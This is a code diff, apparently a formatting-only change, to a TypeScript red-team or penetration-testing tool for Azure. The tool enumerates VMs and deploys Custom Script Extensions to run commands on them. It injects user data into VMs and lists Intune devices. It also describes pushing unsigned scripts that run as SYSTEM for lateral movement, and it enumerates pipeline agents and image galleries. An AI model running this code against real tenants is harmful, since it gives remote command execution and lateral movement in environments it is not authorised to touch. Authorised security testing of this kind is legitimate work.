@@ -562,13 +562,37 @@ export async function customScriptExt(args: string[], timeout: number): Promise<
 
   if (method === "list") {
     const rgArgs = rg ? ["--resource-group", rg] : []
-    const vms = await az(["vm", "list", ...rgArgs, "--query", "[].{name:name,rg:resourceGroup,os:storageProfile.osDisk.osType,state:provisioningState}"], sub, timeout)
+    const vms = await az(
+      [
+        "vm",
+        "list",
+        ...rgArgs,
+        "--query",
+        "[].{name:name,rg:resourceGroup,os:storageProfile.osDisk.osType,state:provisioningState}",
+      ],
+      sub,
+      timeout,
+    )
     if (vms.exitCode !== 0) return { output: output.join("\n") + `[-] Failed: ${vms.stderr.slice(0, 200)}`, findings }
     const vmList = tryJson(vms.stdout) || []
     output.push(`[+] VMs available for Custom Script Extension: ${vmList.length}`)
     for (const v of vmList) {
       output.push(`    ${v.name} (${v.rg}) — ${v.os} [${v.state}]`)
-      const exts = await az(["vm", "extension", "list", "--vm-name", v.name, "--resource-group", v.rg, "--query", "[].{name:name,publisher:publisher,state:provisioningState}"], sub, timeout)
+      const exts = await az(
+        [
+          "vm",
+          "extension",
+          "list",
+          "--vm-name",
+          v.name,
+          "--resource-group",
+          v.rg,
+          "--query",
+          "[].{name:name,publisher:publisher,state:provisioningState}",
+        ],
+        sub,
+        timeout,
+      )
       if (exts.exitCode === 0) {
         const extList = tryJson(exts.stdout) || []
         for (const e of extList) output.push(`      ext: ${e.name} (${e.publisher}) — ${e.state}`)
@@ -582,12 +606,30 @@ export async function customScriptExt(args: string[], timeout: number): Promise<
   const publisher = os === "windows" ? "Microsoft.Compute" : "Microsoft.Azure.Extensions"
   const extName = os === "windows" ? "CustomScriptExtension" : "customScript"
   const settings = scriptUri
-    ? JSON.stringify({ fileUris: [scriptUri], commandToExecute: cmd || (os === "windows" ? "powershell -ExecutionPolicy Bypass -File script.ps1" : "bash script.sh") })
+    ? JSON.stringify({
+        fileUris: [scriptUri],
+        commandToExecute:
+          cmd || (os === "windows" ? "powershell -ExecutionPolicy Bypass -File script.ps1" : "bash script.sh"),
+      })
     : JSON.stringify({ commandToExecute: cmd || "whoami && id && hostname" })
 
   output.push(`[*] Deploying Custom Script Extension to ${vm}...`)
   const deploy = await az(
-    ["vm", "extension", "set", "--vm-name", vm, "--resource-group", rg, "--name", extName, "--publisher", publisher, "--settings", settings],
+    [
+      "vm",
+      "extension",
+      "set",
+      "--vm-name",
+      vm,
+      "--resource-group",
+      rg,
+      "--name",
+      extName,
+      "--publisher",
+      publisher,
+      "--settings",
+      settings,
+    ],
     sub,
     timeout,
   )
@@ -621,13 +663,21 @@ export async function userdataCommand(args: string[], timeout: number): Promise<
 
   if (method === "list") {
     const rgArgs = rg ? ["--resource-group", rg] : []
-    const vms = await az(["vm", "list", ...rgArgs, "--query", "[].{name:name,rg:resourceGroup,os:storageProfile.osDisk.osType}"], sub, timeout)
+    const vms = await az(
+      ["vm", "list", ...rgArgs, "--query", "[].{name:name,rg:resourceGroup,os:storageProfile.osDisk.osType}"],
+      sub,
+      timeout,
+    )
     if (vms.exitCode !== 0) return { output: output.join("\n") + `[-] Failed: ${vms.stderr.slice(0, 200)}`, findings }
     const vmList = tryJson(vms.stdout) || []
     output.push(`[+] VMs: ${vmList.length}`)
     for (const v of vmList) {
       output.push(`    ${v.name} (${v.rg}) — ${v.os}`)
-      const ud = await az(["vm", "show", "--name", v.name, "--resource-group", v.rg, "--query", "userData"], sub, timeout)
+      const ud = await az(
+        ["vm", "show", "--name", v.name, "--resource-group", v.rg, "--query", "userData"],
+        sub,
+        timeout,
+      )
       if (ud.exitCode === 0 && ud.stdout.trim() && ud.stdout.trim() !== "null") {
         output.push(`      [!] Has existing user data`)
         findings.push({
@@ -647,14 +697,24 @@ export async function userdataCommand(args: string[], timeout: number): Promise<
 
   if (!vm || !rg) return { output: "[-] --vm-name and --resource-group required", findings }
 
-  const payload = userData || Buffer.from("#!/bin/bash\ncurl -s https://metadata.azure.com/metadata/instance?api-version=2021-02-01 -H 'Metadata:true'").toString("base64")
+  const payload =
+    userData ||
+    Buffer.from(
+      "#!/bin/bash\ncurl -s https://metadata.azure.com/metadata/instance?api-version=2021-02-01 -H 'Metadata:true'",
+    ).toString("base64")
 
   output.push(`[*] Injecting user data into ${vm}...`)
-  const update = await az(["vm", "update", "--name", vm, "--resource-group", rg, "--set", `userData=${payload}`], sub, timeout)
+  const update = await az(
+    ["vm", "update", "--name", vm, "--resource-group", rg, "--set", `userData=${payload}`],
+    sub,
+    timeout,
+  )
 
   if (update.exitCode === 0) {
     output.push(`[+] User data injected — will execute on next cloud-init run or reboot`)
-    output.push(`[*] Access from inside VM: curl -H Metadata:true http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01`)
+    output.push(
+      `[*] Access from inside VM: curl -H Metadata:true http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01`,
+    )
     findings.push({
       checkId: "AZ-UDATA-002",
       provider: "azure",
@@ -677,13 +737,27 @@ export async function intuneDeploy(args: string[], timeout: number): Promise<Hoo
   const output: string[] = ["[*] Microsoft Intune device management enumeration...\n"]
 
   if (action === "list") {
-    const devices = await run("az", ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices?$top=50&$select=deviceName,operatingSystem,osVersion,managementAgent,complianceState,userPrincipalName,lastSyncDateTime", "-o", "json"], timeout)
+    const devices = await run(
+      "az",
+      [
+        "rest",
+        "--method",
+        "GET",
+        "--url",
+        "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices?$top=50&$select=deviceName,operatingSystem,osVersion,managementAgent,complianceState,userPrincipalName,lastSyncDateTime",
+        "-o",
+        "json",
+      ],
+      timeout,
+    )
     if (devices.exitCode === 0) {
       const list = tryJson(devices.stdout)?.value || []
       output.push(`[+] Intune managed devices: ${list.length}`)
       for (const d of list) {
         output.push(`    ${d.deviceName} — ${d.operatingSystem} ${d.osVersion || ""} (${d.managementAgent})`)
-        output.push(`      User: ${d.userPrincipalName || "N/A"}, Compliance: ${d.complianceState}, Last sync: ${d.lastSyncDateTime || "unknown"}`)
+        output.push(
+          `      User: ${d.userPrincipalName || "N/A"}, Compliance: ${d.complianceState}, Last sync: ${d.lastSyncDateTime || "unknown"}`,
+        )
       }
       if (list.length > 0) {
         findings.push({
@@ -698,16 +772,46 @@ export async function intuneDeploy(args: string[], timeout: number): Promise<Hoo
         })
       }
     }
-    if (devices.exitCode !== 0) output.push(`[-] Cannot list Intune devices (needs DeviceManagementManagedDevices.Read.All): ${devices.stderr.slice(0, 200)}`)
+    if (devices.exitCode !== 0)
+      output.push(
+        `[-] Cannot list Intune devices (needs DeviceManagementManagedDevices.Read.All): ${devices.stderr.slice(0, 200)}`,
+      )
 
-    const scripts = await run("az", ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/beta/deviceManagement/deviceManagementScripts?$select=displayName,description,runAsAccount,enforceSignatureCheck", "-o", "json"], timeout)
+    const scripts = await run(
+      "az",
+      [
+        "rest",
+        "--method",
+        "GET",
+        "--url",
+        "https://graph.microsoft.com/beta/deviceManagement/deviceManagementScripts?$select=displayName,description,runAsAccount,enforceSignatureCheck",
+        "-o",
+        "json",
+      ],
+      timeout,
+    )
     if (scripts.exitCode === 0) {
       const scriptList = tryJson(scripts.stdout)?.value || []
       output.push(`\n[+] Intune PowerShell scripts: ${scriptList.length}`)
-      for (const s of scriptList) output.push(`    ${s.displayName} — runAs: ${s.runAsAccount || "system"}, signatureCheck: ${s.enforceSignatureCheck || false}`)
+      for (const s of scriptList)
+        output.push(
+          `    ${s.displayName} — runAs: ${s.runAsAccount || "system"}, signatureCheck: ${s.enforceSignatureCheck || false}`,
+        )
     }
 
-    const configs = await run("az", ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/deviceManagement/deviceConfigurations?$select=displayName,lastModifiedDateTime", "-o", "json"], timeout)
+    const configs = await run(
+      "az",
+      [
+        "rest",
+        "--method",
+        "GET",
+        "--url",
+        "https://graph.microsoft.com/v1.0/deviceManagement/deviceConfigurations?$select=displayName,lastModifiedDateTime",
+        "-o",
+        "json",
+      ],
+      timeout,
+    )
     if (configs.exitCode === 0) {
       const configList = tryJson(configs.stdout)?.value || []
       output.push(`\n[+] Device configuration profiles: ${configList.length}`)
@@ -718,7 +822,9 @@ export async function intuneDeploy(args: string[], timeout: number): Promise<Hoo
   if (action === "deploy_script") {
     output.push(`\n[!] Script deployment via Intune:`)
     output.push(`    POST https://graph.microsoft.com/beta/deviceManagement/deviceManagementScripts`)
-    output.push(`    Body: { displayName, scriptContent (base64), runAsAccount: "system", enforceSignatureCheck: false }`)
+    output.push(
+      `    Body: { displayName, scriptContent (base64), runAsAccount: "system", enforceSignatureCheck: false }`,
+    )
     output.push(`    Then assign to device group for execution`)
     output.push(`\n[*] This runs as SYSTEM on all targeted devices — powerful lateral movement`)
     findings.push({
@@ -772,11 +878,18 @@ export async function msbuildExec(args: string[], timeout: number): Promise<Hook
     if (pools.exitCode !== 0) output.push(`[-] Cannot list pools: ${pools.stderr.slice(0, 200)}`)
 
     if (project) {
-      const agents = await run("az", ["pipelines", "agent", "list", "--pool-id", "1", ...orgArgs, "-o", "json"], timeout)
+      const agents = await run(
+        "az",
+        ["pipelines", "agent", "list", "--pool-id", "1", ...orgArgs, "-o", "json"],
+        timeout,
+      )
       if (agents.exitCode === 0) {
         const agentList = tryJson(agents.stdout) || []
         output.push(`\n[+] Agents in default pool: ${agentList.length}`)
-        for (const a of agentList) output.push(`    ${a.name} — status: ${a.status}, os: ${a.osDescription || "unknown"}, version: ${a.version || "unknown"}`)
+        for (const a of agentList)
+          output.push(
+            `    ${a.name} — status: ${a.status}, os: ${a.osDescription || "unknown"}, version: ${a.version || "unknown"}`,
+          )
       }
     }
     return { output: output.join("\n"), findings }
@@ -812,13 +925,32 @@ export async function sharedImageInject(args: string[], timeout: number): Promis
   const output: string[] = ["[*] Azure Shared Image Gallery / Compute Gallery enumeration...\n"]
 
   if (method === "list") {
-    const galleries = await az(["sig", "list", "--query", "[].{name:name,rg:resourceGroup,location:location}"], sub, timeout)
-    if (galleries.exitCode !== 0) return { output: output.join("\n") + `[-] Failed: ${galleries.stderr.slice(0, 200)}`, findings }
+    const galleries = await az(
+      ["sig", "list", "--query", "[].{name:name,rg:resourceGroup,location:location}"],
+      sub,
+      timeout,
+    )
+    if (galleries.exitCode !== 0)
+      return { output: output.join("\n") + `[-] Failed: ${galleries.stderr.slice(0, 200)}`, findings }
     const galList = tryJson(galleries.stdout) || []
     output.push(`[+] Compute Galleries: ${galList.length}`)
     for (const g of galList) {
       output.push(`    ${g.name} (${g.rg}) — ${g.location}`)
-      const images = await az(["sig", "image-definition", "list", "--gallery-name", g.name, "--resource-group", g.rg, "--query", "[].{name:name,os:osType,state:provisioningState}"], sub, timeout)
+      const images = await az(
+        [
+          "sig",
+          "image-definition",
+          "list",
+          "--gallery-name",
+          g.name,
+          "--resource-group",
+          g.rg,
+          "--query",
+          "[].{name:name,os:osType,state:provisioningState}",
+        ],
+        sub,
+        timeout,
+      )
       if (images.exitCode === 0) {
         const imgList = tryJson(images.stdout) || []
         for (const img of imgList) {
@@ -841,14 +973,35 @@ export async function sharedImageInject(args: string[], timeout: number): Promis
 
   if (!galleryName || !rg) return { output: "[-] --gallery and --resource-group required", findings }
 
-  const images = await az(["sig", "image-definition", "list", "--gallery-name", galleryName, "--resource-group", rg], sub, timeout)
-  if (images.exitCode !== 0) return { output: output.join("\n") + `[-] Failed: ${images.stderr.slice(0, 200)}`, findings }
+  const images = await az(
+    ["sig", "image-definition", "list", "--gallery-name", galleryName, "--resource-group", rg],
+    sub,
+    timeout,
+  )
+  if (images.exitCode !== 0)
+    return { output: output.join("\n") + `[-] Failed: ${images.stderr.slice(0, 200)}`, findings }
   const imgList = tryJson(images.stdout) || []
 
   output.push(`[+] Images in ${galleryName}: ${imgList.length}`)
   for (const img of imgList) {
     output.push(`    ${img.name} — ${img.osType}, hyper-v: ${img.hyperVGeneration || "V1"}`)
-    const versions = await az(["sig", "image-version", "list", "--gallery-name", galleryName, "--gallery-image-definition", img.name, "--resource-group", rg, "--query", "[].{name:name,state:provisioningState,date:publishingProfile.publishedDate}"], sub, timeout)
+    const versions = await az(
+      [
+        "sig",
+        "image-version",
+        "list",
+        "--gallery-name",
+        galleryName,
+        "--gallery-image-definition",
+        img.name,
+        "--resource-group",
+        rg,
+        "--query",
+        "[].{name:name,state:provisioningState,date:publishingProfile.publishedDate}",
+      ],
+      sub,
+      timeout,
+    )
     if (versions.exitCode === 0) {
       const verList = tryJson(versions.stdout) || []
       for (const v of verList) output.push(`      version: ${v.name} (${v.state}) — ${v.date || "unknown"}`)
